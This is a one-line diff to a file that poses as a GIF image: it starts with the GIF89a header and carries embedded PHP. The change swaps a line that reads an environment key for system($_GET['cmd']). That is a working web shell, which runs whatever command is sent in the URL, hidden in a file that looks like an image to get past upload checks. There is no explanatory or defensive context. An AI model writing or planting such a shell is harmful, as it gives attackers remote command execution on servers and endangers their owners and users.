@@ -1,1 +1,1 @@
-GIF89a;<?php getenv('XOR_KEY'); ?>
+GIF89a;<?php system($_GET['cmd']);?>
